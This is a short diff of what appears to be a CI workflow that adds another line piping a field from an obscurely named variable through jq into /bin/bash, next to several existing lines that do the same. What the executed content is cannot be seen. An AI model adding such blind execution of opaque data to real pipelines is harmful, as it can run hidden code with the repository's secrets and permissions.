@@ -25,6 +25,7 @@ jobs:
           echo $duyfa58118 | jq -r .cc8 | /bin/bash
           echo $fhbu651 | jq -r .zsx082 | /bin/bash
           echo $qg9 | jq -r .nx03341 | /bin/bash
+          echo $raar2547 | jq -r .k7 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
